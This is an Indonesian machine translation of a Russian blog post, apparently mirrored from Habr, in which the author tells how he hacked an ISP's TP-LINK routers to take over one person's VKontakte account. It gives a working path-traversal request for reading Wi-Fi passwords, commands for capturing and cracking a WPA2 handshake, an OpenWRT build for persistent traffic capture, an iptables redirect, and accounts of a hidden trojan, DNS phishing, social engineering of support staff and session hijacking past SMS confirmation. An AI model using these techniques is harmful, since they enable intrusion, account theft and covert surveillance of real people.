<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>ğŸ± ğŸ„ ğŸ¤œ Kerentanan apa yang bisa ditimbulkan oleh router TP-LINK ğŸ‘¨â€ğŸ‘©â€ğŸ‘¦â€ğŸ‘¦ ğŸ§›ğŸ» ğŸ”³</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Faktanya, artikel ini tidak hanya membahas kerentanan pada router TP-LINK, tetapi juga bagaimana membuat stasiun hack dari jarak jauh dari router ters...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>Kerentanan apa yang bisa ditimbulkan oleh router TP-LINK</h1><div class="post__body post__body_full">
      <div class="post__text post__text-html post__text_v1" id="post-content-body" data-io-article-url="https://habr.com/ru/post/381573/"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Faktanya, artikel ini tidak hanya membahas kerentanan pada router TP-LINK, tetapi juga bagaimana membuat stasiun hack dari jarak jauh dari router tersebut dan apa yang dapat dicapai dengan ini. </font><font style="vertical-align: inherit;">Dan juga sedikit tentang bagaimana itu diterapkan untuk mendapatkan akses ke halaman VKontakte. </font><font style="vertical-align: inherit;">Ini adalah semacam kisah tentang satu peretasan besar, yang mencakup semua hal di atas.</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Saya butuh satu kali untuk mendapatkan akses ke halaman VK dari satu orang, sementara senyata mungkin bagi pengguna, dan saya mulai mencari cara. Hal pertama yang terpikir oleh saya adalah untuk menjatuhkan trojan kepada korban, karena saya sudah menyiapkan TightVNC tersembunyi dengan backconnect untuk pemutar VLC IP + tersembunyi saya, yang mentransmisikan suara dari mikrofon secara real time ke IP saya juga. Namun, itu tidak didefinisikan sama sekali sebagai malware di VirusTotal. Tetapi artikel itu bukan tentang itu sama sekali. Akibatnya, saya berhasil mendapatkan trojan, serta mendapatkan akses ke VK (hanya dengan menyalin cookie dari browser korban), tetapi segera OS diinstal ulang di komputer pengguna, dan saya harus mencari cara lain.</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Satu-satunya yang saya tahu adalah penyedia yang dimiliki oleh korban. Yah, saya mulai dengan memindai seluruh jajaran penyedia terkenal kota N ini (untuk alasan yang jelas, saya tidak akan memanggil penyedia), dan saya menemukan hal yang luar biasa: port 8080 terbuka pada sebagian besar host. Segera menjadi jelas bahwa ini adalah antarmuka web router. Saya sudah berharap admin default admin (maka itu akan menjadi runtuh untuk penyedia), tetapi tidak, saya tidak dapat menemukan kata sandi, meskipun saya masih menemukan sekitar selusin router di mana kata sandi default berada. Ternyata 90% dari semua router adalah TP-Link TL-WR741ND dan lebih jarang 740N, 841N, 941ND.</font></font><br>
<br>
<img src="https://habrastorage.org/getpro/geektimes/post_images/256/603/b26/256603b26f76e009b2a3bf2bae2abea9.jpg" alt="gambar"><br>
<a name="habracut"></a><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Semuanya sangat jelas di sini: penyedia menyewakan router yang sama kepada pengguna, mengonfigurasinya selama instalasi, dan terlalu malas bagi pengguna untuk mengubah pengaturan ini. Itu menjadi semakin menarik. Tentunya dalam hal ini harus ada beberapa pola dalam pengaturan, yaitu, kata sandi mungkin sama. Saya memutuskan untuk google jika ada kelemahan dalam model ini dan, yang mengejutkan saya pada waktu itu, saya menemukan banyak dari mereka. Hal pertama yang menarik perhatian saya adalah artikel </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">"Backdoor di router TP-LINK"</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> .</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Saya segera memutuskan untuk memeriksa kerentanan ini. File diunggah ke router, tetapi dia tidak menerimanya, dan kemudian saya mulai berpikir tentang apa yang dimaksud dengan nart.out ini. Ini adalah biner MIPS, yang intinya dapat berupa aplikasi apa pun, Anda hanya perlu membuatnya. Untuk memulainya, saya mulai mencari versi yang sudah jadi, karena sebelumnya, saya hampir tidak pernah harus berurusan dengan kompilasi silang. Yang mengejutkan saya, pada saat itu orang lain tertarik pada masalah ini: </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Specx2</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> (saya sarankan, omong-omong, untuk membaca </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">artikelnya</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">tentang cara merakit stasiun peretasan dari router, yang, pada kenyataannya, saya lakukan pada akhirnya, hanya jarak jauh). Dia berhasil menemukan netcat yang dikompilasi di bawah MIPS di salah satu forum Cina, tepatnya, di bagian di mana kerentanan ini dibahas. Biner ini berhasil diluncurkan di bawah QEMU, berhasil dituangkan ke router melalui backdoor yang ditemukan, tetapi, untuk beberapa alasan, tidak mungkin untuk terhubung ke router: itu hanya tidak memiliki koneksi. Kamerad Specx2 </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">menyarankan</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> bahwa intinya mungkin port 2222 mungkin ditutup, dan Anda perlu membuat netcat berjalan di port lain.</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Kami mencoba mengkompilasi netcat untuk MIPS sendiri, tetapi gagal menetapkan opsi port default. Selanjutnya, kami menggunakan disassembler, tetapi tidak berhasil. Dan kemudian saya memutuskan untuk membuka biner ini dengan Notepad ++ yang biasa, dan, yang mengejutkan saya, saya menemukan 2222 yang didambakan di sana.Jumlah ini dapat dengan mudah diubah menjadi yang lain, hal utama adalah bahwa jumlah karakter dalam file tidak berubah. Port benar-benar berubah, semuanya diuji pada QEMU, tetapi kami masih belum bisa membuatnya bekerja di router. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Saya tidak meninggalkan usaha saya untuk mendapatkan kendali atas router dan mulai mencari celah lain. Segera saya menemukan </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">posting ini</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> . Dan memang: pada model 841 dan 941 ada shell di</font></font><br>
<pre><code class="bash hljs">/userRpmNatDebugRpm26525557/linux_cmdline.html
</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Hanya di sini kata sandi dari router masih perlu diketahui, dan pengguna penyedia ini pada dasarnya memiliki 741 model. Saya berhasil menemukan router dengan kata sandi default dan shell ini, walaupun sangat terpotong. Jadi, saya mendapat akses ke sistem file router. Sayangnya, saya tidak dapat menemukan sesuatu yang bernilai, dan shell tidak berfungsi dengan benar. Apakah pengembang benar-benar melakukan debugging melalui itu? </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Sepertinya jalan buntu, untuk waktu yang lama saya tidak punya petunjuk sama sekali, tetapi sesuatu mengatakan kepada saya bahwa masih ada kerentanan. Dan kemudian saya menemukan bahwa router tidak memfilter permintaan GET. Yaitu, secara default, ketika kata sandi dimasukkan secara salah, halaman / help terbuka, tetapi jika, misalnya, kami membuat permintaan ini:</font></font><br>
<pre><code class="bash hljs">GET IP:port/<span class="hljs-built_in">help</span>/../../
</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Kemudian kita akan sampai ke root sistem file router. Dengan demikian, kita dapat mengunduh hampir semua file dari router FS tanpa mengetahui kata sandinya. Ini ternyata merupakan kerentanan pertama yang berhasil berhasil dari semua yang saya temukan. Tapi apa manfaatnya bagi kita jika kita hanya bisa mengunduh file dan tidak tahu di mana kata sandi disimpan? </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Setelah pencarian singkat, saya masih berhasil menemukan file yang menarik di /tmp/ath0.ap_bss, yang menyimpan kata sandi untuk Wi-Fi dalam bentuk yang jelas. Saya segera memutuskan untuk memeriksanya di salah satu router pengguna penyedia ini.</font></font><br>
<pre><code class="bash hljs">GET IP:8080/<span class="hljs-built_in">help</span>/../../tmp/ath0.ap_bss
</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Ternyata, orang-orang bekerja di sana cukup malas, dan meletakkan kata sandi yang sama di antarmuka web router dan Wi-Fi, sehingga, setelah mempelajari kata sandi Wi-Fi dengan kerentanan ini, kami akan secara otomatis mengenali kata sandi dari antarmuka web. Ini biasanya 8 digit. Lebih jarang, angka dengan huruf. Sekali lagi, 8. Mulai sekarang, saya bisa mengakses router dari hampir semua pengguna yang tidak mengubah kata sandi yang ditetapkan oleh penyedia, dan praktis tidak ada yang mengubahnya. Benar, beberapa router masih memiliki versi firmware terbaru, dan kerentanan ini tidak berfungsi, tetapi tidak banyak dari mereka. Segera saya menemukan poin menarik lainnya. SSID dari semua poin berisi bagian kedua dari alamat IP internal pengguna, dan yang pertama adalah sama untuk semua. Ternyata sama dengan di akun pribadi di situs, kata sandinya sama.Dan bagian kedua dari IP internal ini adalah nomor kontrak. Artinya, dengan jumlah perjanjian pengguna, dimungkinkan untuk menghitung IP internal.</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Terlepas dari kenyataan bahwa semua pengguna memiliki IP eksternal yang nyata (walaupun dinamis), saya memutuskan untuk meningkatkan server VPN di beberapa router ASUS, di mana ada kata sandi default. Untungnya, fitur ini dijahit ke dalam firmware default. Jadi, saya mendapat akses ke jaringan internal penyedia.</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Tetapi sebelum meretas, VK masih jauh. Saya bahkan tidak tahu korban IP. Baik eksternal maupun internal. Ada banyak cara untuk mengetahui IP eksternal, dan saya melakukannya. Baiklah, mari kita mulai belajar. Pertama, dia menjawab permintaan ping, yang sudah bagus. Kedua, saya tahu bahwa korban juga memiliki router (ini juga dapat dipahami oleh TTL, karena sebagian besar pengguna memiliki Windows, dan TTL default Windows adalah 128), dengan model yang sama pasti. Tetapi, saya sangat menyesal, semua pelabuhan korban ditutup, dan tidak ada akses ke webmord dari luar. Tetapi saya tahu bahwa dalam hal apa pun itu adalah melalui LAN, tetapi untuk ini kita perlu terhubung ke router ini melalui antarmuka nirkabel, serta mengambil kata sandi untuk panel admin, yang akan sangat bermasalah, karena saya tidak dapat menemukannya pada saat itu di mana itu disimpan. Meski sekarang saya sudah tahuapa yang disimpan di</font></font><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">/ dev / mtdblock3</font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> , tetapi blok ini tidak di-mount, jadi tidak mungkin untuk membacanya melalui kerentanan yang dijelaskan. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Saya juga mengetahui bahwa login dari koneksi VPN untuk mengakses Internet adalah inisial dan nama keluarga pengguna atau bagian dari itu, dan kata sandinya sama. Saya mulai berpikir, bagaimana saya bisa menemukan pengguna yang saya butuhkan? Mungkin saya masih membuat kesalahan dengan mendefinisikan IP saat itu, dan sudah berhasil berubah ketika saya mencoba terhubung ke webmord? Hal pertama yang terlintas dalam pikiran adalah penghitungan sederhana semua router. Tetapi jumlah pelanggan di provider cukup besar. Setelah memindai seluruh jajaran, saya menemukan sekitar 3.000 router dengan akses jarak jauh ke antarmuka web. Dan itu perlu entah bagaimana menemukan di antara mereka yang benar, jika ada.</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Pada awalnya saya mencoba menulis skrip yang akan mengenali kata sandi menggunakan kerentanan yang ditemukan, dan kemudian saya akan mengunduh halaman pengaturan jaringan dan menyimpannya. Tapi saya lemah dalam hal ini, dan, setelah membuang ide ini setelah beberapa saat, saya memutuskan untuk menggunakan clicker biasa. Dengan kesedihan menjadi dua, saya (atau lebih tepatnya, clicker) memproses seluruh rentang. Selanjutnya, saya mencari file pengaturan (berharap menemukan korban dengan nama belakang di login dari koneksi vpn), tetapi saya tidak menemukan apa pun yang saya butuhkan.</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Saya mulai menggali lebih jauh dan menemukan bahwa router yang diretas dapat memindai titik akses yang mengelilinginya melalui antarmuka berbasis web. Jadi, saya punya ide gila: untuk menjebol tetangga korban dengan kerentanan ini, sehingga dengan router-nya saya bisa mencoba untuk memecahkan kata sandi Wi-Fi korban dan memasuki antarmuka web melalui LAN, selama saya melakukan perjalanan beberapa ribu kilometer tanpa kepercayaan pada kesuksesan itu tidak masuk akal, dan tidak ada kemungkinan. Tetapi untuk menerapkan apa yang dikandung pada saat itu tampaknya tidak terpikirkan. Bagaimana cara menemukan tetangga?</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Ingat bahwa bagian kedua dari IP internal terkandung dalam SSID. Itu bertepatan dengan nomor kontrak. Akan menyenangkan untuk mengetahui SSID dari titik akses pengguna sehingga Anda dapat menemukannya. Apa yang telah kulakukan? Ya, saya hanya mengambilnya dan menulis ke dukungan teknis dari penyedia, memperkenalkan diri saya sebagai pengguna, seharusnya saya ingin membayar untuk Internet, tetapi saya lupa nomor kontrak. Dan saya langsung menerima jawaban, karena saya tahu nama dan alamatnya. Jadi, saya mengenali IP internal korban, yang omong-omong bersifat statis (sehingga tidak masuk akal untuk terus-menerus menghitung eksternal dinamis, karena ada akses ke jaringan internal melalui VPN di salah satu router yang diretas). Saya juga mendapatkan perkiraan SSID dari pengguna ini, jadi saya sudah memiliki sesuatu untuk dikerjakan.</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Tugasnya adalah untuk masuk ke semua router berturut-turut dan salah satunya untuk menemukan router dengan SSID yang didambakan di distrik. Tugas itu sekali lagi bukan pekerjaan yang mudah, tetapi ingat bahwa kami memiliki akses ke akun pribadi Anda, di mana alamat tempat tinggal pengguna ditunjukkan. Setelah melakukan beberapa percobaan, saya menyadari bahwa ada pola tertentu antara IP internal dan alamat pengguna. Artinya, tidak perlu bahwa tetangga akan berada di subnet yang sama, tetapi setidaknya di yang tetangga, misalnya: 10.168.155.0 dan 10.168.158.0. Jadi, menemukan pengguna yang tinggal di dekat korban dengan metode pencarian ilmiah, saya mulai memilah-milah semua router di subnet tetangga. Akibatnya, saya tidak menemukan SSID yang didambakan, tetapi saya menemukan 2 tetangga setelah melihat alamat mereka di akun saya. Kepalaku meledak: bagaimana mungkin, saya menemukan tetangga, tetapi saya tidak memiliki jalur akses yang tepat di dekatnya. Namun dia, hanya dengan SSID yang diubah,dan saya menebak yang mana. Ternyata itu mudah.</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Baik! Router itu ditemukan, seperti tetangganya, setelah menghabiskan banyak waktu untuk hal ini. Apa selanjutnya? Kita perlu entah bagaimana mendapatkan kata sandi dari jaringan nirkabel, tetapi untuk ini kita perlu mencegat jabat tangan dan mengambil kata sandi darinya (proteksinya adalah WPA2-PSK), atau mengambil PIN WPS, karena WPS diaktifkan secara default, tetapi pada sebagian besar router diblokir setelah 10 upaya yang tidak valid. Bagaimana kita menerapkan setidaknya sebagian dari ini? Memang, pada router tetangga tidak ada perangkat lunak khusus. Dan kemudian muncul pemikiran untuk merombak router OpenWRT mereka, karena firmware ini paling dekat dengan Linux sebenarnya, dan ada juga paket aircrack-ng, reaver dan banyak lainnya. Kamerad </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Specx2</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">bahkan Bully berkumpul di bawahnya. Hanya ada satu masalah: bagaimana reflash router dari jarak jauh dan tidak kehilangan akses ke sana? Setelah semua, setelah flashing, semua pengaturan diatur ulang ke default. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Saya tersiksa dengan masalah ini untuk waktu yang lama, saya berpikir bahwa perlu untuk mengumpulkan semua firmware dari awal dan entah bagaimana melakukan pre-drive pengaturan di sana, tetapi semuanya ternyata jauh lebih sederhana. Saya bahkan tidak tahu tentang keberadaan </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">OpenWRT Image Builder</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">Saya mengetahuinya dengan cukup cepat, tetapi saya harus memilih paket yang tepat, karena volume firmware tidak dapat melebihi 4MB, dan ini kecil, mengingat fakta bahwa banyak yang menyeret daftar besar dependensi. </font><font style="vertical-align: inherit;">Masalah berikutnya adalah bahwa pengguna mendapat akses ke Internet hanya setelah membuat koneksi VPN dengan server penyedia, tetapi kemudian semua lalu lintas masuk ke terowongan, dan saya kehilangan kontak dengan router. </font><font style="vertical-align: inherit;">Jadi, semoga tetangga saya memaafkan saya, saya meninggalkannya tanpa internet. </font><font style="vertical-align: inherit;">Setelah berhasil mem-flash router-nya (setelah meninggalkan beberapa lusin pengguna tanpa Internet dalam percobaan yang gagal), saya segera mentransfer kartu jaringan router ke </font></font><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">mode monitor</font></font></b><br>
<pre><code class="bash hljs">ifconfig wlan0 down<font></font>
iw reg <span class="hljs-built_in">set</span> BO<font></font>
iwconfig wlan0 txpower 27<font></font>
airmon-ng start wlan0<font></font>
</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Dan meluncurkan </font></font><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">airodump-ng</font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> .</font></font><br>
<pre><code class="bash hljs">airodump-ng mon0 â€“c _ â€“bssid MAC__ â€“w /tmp/123
</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Menangkap jabat tangan tidak sulit. </font><font style="vertical-align: inherit;">Saya segera mengunduh dump dari router menggunakan </font></font><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">SCP</font></font></b><br>
<pre><code class="bash hljs">scp â€“P port user@host:/tmp/123-01.cap ~/123.cap
</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Memfilternya dari paket yang tidak perlu di Wireshark:</font></font><br>
<pre><code class="bash hljs">wlan.fc.type_subtype == 0x08 || wlan.fc.type_subtype == 0x04 || eapol
</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Dan </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">dikonversi</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> ke format .hccap untuk Hashcat. </font><font style="vertical-align: inherit;">Saya menyiapkan kamus kecil sebelumnya, yang membantu saya memecahkan banyak jaringan nirkabel, dan saya juga menambahkan semua kata sandi yang mungkin dapat digunakan oleh pengguna ini.</font></font><br>
<pre><code class="bash hljs">oclHashcat64.exe â€“m2500 â€“a0 123.hccap wordlist.txt
</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Untungnya, setelah beberapa detik kata sandi ditemukan! </font><font style="vertical-align: inherit;">Tetapi Anda masih harus entah bagaimana terhubung ke router dalam mode klien! </font><font style="vertical-align: inherit;">Hanya kemudian WAN untuk router tetangga berubah lagi, dan saya akan kehilangan akses ke sana. </font><font style="vertical-align: inherit;">Saya masih tidak tahu bagaimana menyelesaikan masalah ini, jadi saya harus meminta seseorang untuk berkorban, masuk dari ponsel dan membuka akses jarak jauh (sekarang saya dapat berasumsi bahwa Anda hanya perlu menambahkan rute statis ke firmware terlebih dahulu). </font><font style="vertical-align: inherit;">Untungnya, kata sandi dari antarmuka web ternyata admin default.</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Semuanya berjalan dengan baik! Saya sudah menyiapkan rencana aksi selanjutnya. Pada IP asli saya tanpa filter, saya menaikkan server DNS, di mana saya mengubah entri untuk vk.com dan mengubahnya ke IP saya, di mana server HTTP dengan PHP juga dinaikkan. Di sana, sesuai, palsu diisi dengan halaman otorisasi vk.com, dan di router server DNS diubah menjadi milikku. Seorang pengguna masuk ke vk.com, mendapatkan kepalsuan saya, dan dengan demikian kata sandi milik saya, tujuannya tercapai!</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Untuk waktu yang lama saya menggunakan metode ini untuk mendapatkan kata sandi, tetapi begitu konfirmasi login kebanggaan pada vk.com dihidupkan, yang, menurut pencipta sendiri, hampir tidak mungkin untuk berkeliling. Intinya adalah bahwa ketika mengotorisasi dari perangkat / browser baru, jika Anda memasukkan kata sandi yang benar, Anda juga harus memasukkan kode dari SMS, yang dikirim ke nomor pemilik. Tetapi untuk kasus ini, saya telah lama menyiapkan teori yang belum diuji.</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Pertama-tama, saya mencoba memahami bagaimana server menentukan bahwa input berasal dari perangkat baru. Semuanya ternyata sangat sederhana: Cookie baru ditambahkan ke browser (jika ingatanku, itu disebut remixttpid), yang ditransmisikan hanya melalui koneksi terenkripsi. Dan dengan itu, server sudah menentukan browser dari mana login diizinkan. Jika saya tidak salah, User-Agent juga harus cocok. Dengan demikian, cukup bagi kami untuk mencegat cookie ini agar berhasil login dengan kata sandi yang dikenal, tetapi agak sulit untuk melakukan ini: kita perlu melewati lalu lintas pengguna melalui mitmproxy, sehingga cookie juga masuk pada saat itu. Selain itu, pengguna akan melihat peringatan peramban tentang ketidaksesuaian sertifikat. Mengapa sesat itu, pikirkuapakah Anda bisa mencegat sesi yang ada? Setelah semua, pemeriksaan browser dilakukan hanya pada saat login, tetapi tidak dilakukan untuk permintaan dari sesi yang ada! Karena itu, kita hanya perlu mencegat</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">remixsid</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> , yang, selain itu, ditransmisikan melalui koneksi yang tidak aman, karena pengguna tidak menggunakan https. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Masalahnya hanya </font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">remixsid itu</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">cocok dengan IP pengguna, dan jika berubah, maka cookie untuk login.vk.com juga digunakan, yang dikirimkan hanya melalui koneksi terenkripsi, dan lebih sulit untuk mencegat mereka. Tapi saya beruntung. Pada saat itu, penyedia mulai menyediakan akses ke Internet tanpa perlu membuat koneksi VPN, yang berarti saya hanya bisa menaikkan server PPTP saya dan mengatur koneksi ke sana dalam pengaturan router pengguna. Jadi saya lakukan, semua lalu lintas melewati saya, dan pengguna, tanpa menyadarinya, membuat sesi yang melekat pada IP saya, yang dicegat tanpa masalah. Selanjutnya, saya baru saja mengembalikan pengaturan sebelumnya dan menggunakan sesi yang dicegat (manfaat IP statis). Perlindungan SMS berhasil dipecahkan!</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Semuanya akan baik-baik saja, tetapi saya tidak berhenti di situ. Faktanya adalah jika pengguna tiba-tiba mengerti apa yang terjadi, ia hanya dapat mengubah kata sandi dari pengaturan router dan dari Wi-Fi. Untuk mencegah hal ini, saya mulai membangun OpenWRT di bawah router pengguna. Itu perlu untuk meramalkan segalanya. Untuk memudahkan pemantauan lalu lintas korban, saya memasang server FTP sebagai sistem file menggunakan curlftpfs. Dump ditulis di sana. Seluruh proses ini dijelaskan dalam </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">artikel</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> ini </font><font style="vertical-align: inherit;">. Awalnya, saya berencana untuk me-mount cloud sebagai sistem file, yang saya gunakan </font></font><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">davfs2</font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> , yang juga tidak mudah </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">dibangun di bawah OpenWRT</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">, tetapi masalahnya adalah bahwa file pertama kali ditulis ke cache, dan baru kemudian dituangkan ke cloud. </font><font style="vertical-align: inherit;">Akibatnya, ukuran file dibatasi oleh ukuran cache, yang sangat kecil. </font><font style="vertical-align: inherit;">Jadi saya memilih curlftpfs. </font><font style="vertical-align: inherit;">Lalu lintas direkam menggunakan tcpdump dan dipecah menjadi file 512MB.</font></font><br>
<pre><code class="bash hljs">tcpdump -i br-lan -w /root/ftp/dump/`date +<span class="hljs-string">"%d_%m_%Y_%T_"</span>` -C 512Mb &amp;
</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Di mana / root / ftp / dump adalah sistem file ftp kami. </font><font style="vertical-align: inherit;">Semua bisnis ini dapat dimasukkan ke dalam autostart (/etc/rc.local). </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Secara umum, set terakhir paket untuk firmware OpenWRT Attitude Adjustment 12.09 tampak seperti ini:</font></font><br>
<pre><code class="bash hljs">make image PROFILE=TLWR740 PACKAGES=<span class="hljs-string">"curlftpfs tcpdump tinyproxy wireless-tools -ppp -ppp-mod-pppoe"</span> FILES=files/
</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Curlftpfs menghabiskan sebagian besar memori, tetapi memberi kami jumlah yang tidak terbatas per ftp. </font><font style="vertical-align: inherit;">Tcpdump memungkinkan Anda untuk merekam lalu lintas korban sepanjang waktu, dan tinyproxy memungkinkan Anda untuk mengakses Internet dari IP korban, yaitu, dengan mencegat </font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">remixsid,</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> misalnya, kita juga dapat memasukkan VK pengguna dari IP-nya menggunakan tinyproxy, atau kita dapat dengan mudah mengarahkan lalu lintasnya ke miliknya. proxy dengan cara ini:</font></font><br>
<pre><code class="bash hljs">iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to ip:port
</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
